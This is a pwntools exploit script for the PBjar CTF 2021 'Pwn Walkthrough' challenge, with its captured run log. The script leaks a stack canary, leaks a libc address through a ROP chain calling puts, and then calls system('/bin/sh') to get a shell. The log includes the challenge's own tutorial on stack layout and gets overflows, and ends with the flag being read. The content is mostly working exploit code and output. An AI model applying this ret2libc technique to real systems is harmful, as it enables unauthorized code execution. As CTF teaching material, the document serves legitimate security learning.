from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './walkthrough'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "147.182.172.217"
  PORT = 42001
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
libc = elf.libc

pop_rdi_ret = 0x401e9b # pop rdi; ret;

s.recvuntil("canary explained later): ")
canary = int(s.recvuntil("\n"), 16)
print("canary =", hex(canary))

s.recvuntil("what that looks like on the stack.\n")

buf  = b"A"*0x48
buf += p64(canary)
buf += b"B"*8
buf += p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(elf.plt.puts)
buf += p64(elf.sym.main)
s.sendline(buf)

s.recvuntil("out!\n\n")
r = s.recvuntil("\n")[:-1]
puts_addr   = u64(r + b"\x00\x00")
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
print("puts_addr   =", hex(puts_addr))
print("libc_base   =", hex(libc_base))
print("system_addr =", hex(system_addr))
print("binsh_addr  =", hex(binsh_addr))

s.recvuntil("what that looks like on the stack.\n")

buf  = b"A"*0x48
buf += p64(canary)
buf += b"B"*8
buf += p64(pop_rdi_ret+1)
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)

s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_Walkthrough/walkthrough$ python3 solve.py r
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_Walkthrough/walkthrough/walkthrough'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 147.182.172.217 on port 42001: Done
[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
canary = 0x7f6eb60c14f84300
puts_addr   = 0x7f18bac995a0
libc_base   = 0x7f18bac12000
system_addr = 0x7f18bac67410
binsh_addr  = 0x7f18badc95aa
[*] Switching to interactive mode

- - - - - - - - - - - - - - - - - - - - - - -
- - - - - - - - - - Stack - - - - - - - - - -
- - - - - - - - - - - - - - - - - - - - - - -
0000| 0x7ffce3cd0a00 -> 4141414141414141 (buf strt)
0008| 0x7ffce3cd0a08 -> 4141414141414141 
0016| 0x7ffce3cd0a10 -> 4141414141414141 
0024| 0x7ffce3cd0a18 -> 4141414141414141 
0032| 0x7ffce3cd0a20 -> 4141414141414141 
0040| 0x7ffce3cd0a28 -> 4141414141414141 
0048| 0x7ffce3cd0a30 -> 4141414141414141 
0056| 0x7ffce3cd0a38 -> 4141414141414141 (buf end)
0064| 0x7ffce3cd0a40 -> 4141414141414141 
0072| 0x7ffce3cd0a48 -> 7f6eb60c14f84300 (canary)
0080| 0x7ffce3cd0a50 -> 4242424242424242 (rop func base ptr)
0088| 0x7ffce3cd0a58 -> 0000000000401e9c (rop func return ptr)
0096| 0x7ffce3cd0a60 -> 0000000000401e9b (main func base ptr)
0104| 0x7ffce3cd0a68 -> 00007f18badc95aa (main func return ptr)
0112| 0x7ffce3cd0a70 -> 00007f18bac67410 (stack continues below with stuff we don't care abt)
0120| 0x7ffce3cd0a78 -> 0000000000401d00 
0128| 0x7ffce3cd0a80 -> 0000000000401e40 
0136| 0x7ffce3cd0a88 -> 89042033cf91d793 
0144| 0x7ffce3cd0a90 -> 00000000004010f0 
0152| 0x7ffce3cd0a98 -> 00007ffce3cd0b40 
0160| 0x7ffce3cd0aa0 -> 0000000000000000 
0168| 0x7ffce3cd0aa8 -> 0000000000000000 
0176| 0x7ffce3cd0ab0 -> 76fde7a9db51d793 
0184| 0x7ffce3cd0ab8 -> 773555b4ef5fd793 
...
- - - - - - - - - - - - - - - - - - - - - - -
- - - - - - - - - End stack - - - - - - - - -
- - - - - - - - - - - - - - - - - - - - - - -

As you can see, the stack contains many bits of information in a specific layout, so I will attempt to explain it.

First off, local variables for the currently executing function are held at the top of the stack
This is why you see the char buf array at the top of the stack.
Variables that aren't initialized also contain the values held in the stack previously.
This is why the buf array may contain some random values after the input string.
However, the end of the inputted string is signified by a null byte placed by the gets function.

After the buffer array, you can see something called a canary.
This is a security protection against stack overflows, but it is only effective assuming the user doesn't know the canary value.
It is a random value that is tested if it changed when a function returns.
Not all binaries have a canary, you can find out using the checksec command mentioned in the info section.
Probably most rop problems in ctf pwn do not use a canary, but I put one in here for educational purposes.

Next, the stack contains the base pointer for the rop function.
This signifies where the stack frame will be when the current function returns.
This is necessary because the stack needs to point back to the local variables and return address of the function that called it.

Now, we finally have the return address for the rop function.
The return address points to where the code should continue running from after the function finishes.
In this case, it points to code in the main function right after where the rop function is called.
This is the value on the stack you want to overwrite to change the program to run whatever code you want to call next.

Lastly, you can see the base pointer and return address of the main function as well.
Once the rop function returns back to main, these values will be back at the top of the stack.
After that the stack just has more local environment data that goes on for a while.

- - - - - - - - - - - - - - - - - - - - - - -

You now hopefully realize the general idea on how to rop to control the next function called.
You need to input some amount of characters that reach up to the return address and correspond to the address you want to call.
You also need to make sure to input characters that can correspond to the same value as the canary so it does not change value.

However, you may be wondering how you are able to read past the buf array memory.
Well, the function gets is quite insecure, so it will actually read as long of a string as you input, even if it is longer than the memory region it is being inputted into.
This means if you just put a long enough string you can write past the buffer array and onto other stack values.
You can test this by typing a bunch of a's to overwrite the canary and see a message pop up stating there has been stack smashing detected.

- - - - - - - - - - - - - - - - - - - - - - -

We will now use the pwntools python library to create the carefully crafted string perform the rop.
First off, the binary does not used randomized addresses, meaning we can find the address ahead of time.
We want to call the fmtstr function, and you can find the address of that function with this python code:
>>> e = ELF('./walkthrough')
>>> print(hex(e.sym['fmtstr'])

Now, to write an address as a string, you need to understand how memory holds numbers.
Most memory stores numbers in something called reverse endian order, where the lowest byte goes at the earliest address.
That means for example, the number 0x69420 would look like the string '\x20\x94\x06'
Luckily, pwntools also has a function to automatically convert a hex value into a reverse endian string, like this:
>>> print(p64(0x69420))

Finally, to communicate interact with a program, you can use these code snippets:
>>> p = process('./walkthrough') #use this one to test locally
>>> p = remote('netcat.address', [port num]) #use this one to connect over netcat
>>> p.sendline('String to send')
>>> output_of_program = p.recv(256)
>>> output_line = p.recvline()
>>> output_until = p.recvuntil('input: ')
>>> p.interactive() #allow user to input to program directly

- - - - - - - - - - - - - - - - - - - - - - -

Now, to finally put this information all together, you will need to write something like this:
>>> from pwn import *
>>> e = ELF('./walkthrough')
>>> p = process(e.path)
>>> p.recvuntil('later): ')
>>> canary = int(p.recvline(keepends = False), 16) #keepends = False drop the newline character
>>> p.sendline(b'a' * x + p64(canary) + b'a' * y + p64(e.sym['fmtstr'] + 1)) #figure out what x and y values should be
In this particular problem, notice you need the '+ 1' added fmtstr adr, which you won't normally need.
This is due to future scanf calls needing a valid rbp value and this magically fixes it.

Also, you may find the following commands useful, though not necessary for an exploit:
>>> log.info('This func logs info to your terminal, for example the canary: ' + hex(canary))
>>> gdb.attach(p) #open a terminal with gdb containing the current state of your program

Lastly, Pwntools also has a built in tool for calling complicated chains of multiple functions with parameters.
You can read about it at https://docs.pwntools.com/en/stable/rop/rop.html, but it is not very useful for this problem.

I hope you figured it out!

$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 52
lrwxrwxrwx   1 root root    7 Aug 27 07:16 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
drwxr-xr-x   5 root root  340 Sep 12 23:30 dev
drwxr-xr-x   1 root root 4096 Sep 12 23:30 etc
-rw-r--r--   1 root root   32 Sep 12 23:30 flag.txt
drwxr-xr-x   1 root root 4096 Sep 12 23:30 home
lrwxrwxrwx   1 root root    7 Aug 27 07:16 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Aug 27 07:16 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Aug 27 07:16 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Aug 27 07:16 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Aug 27 07:16 media
drwxr-xr-x   2 root root 4096 Aug 27 07:16 mnt
drwxr-xr-x   2 root root 4096 Aug 27 07:16 opt
dr-xr-xr-x 291 root root    0 Sep 12 23:30 proc
drwx------   2 root root 4096 Aug 27 07:27 root
drwxr-xr-x   5 root root 4096 Aug 27 07:27 run
lrwxrwxrwx   1 root root    8 Aug 27 07:16 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Aug 27 07:16 srv
dr-xr-xr-x  13 root root    0 Sep 12 23:30 sys
drwxrwxrwt   1 root root 4096 Sep 12 20:28 tmp
drwxr-xr-x   1 root root 4096 Aug 27 07:16 usr
drwxr-xr-x   1 root root 4096 Aug 27 07:27 var
$ cat flag.txt
flag{4nd_s0_th3_3xpl01ts_b3g1n}
'''
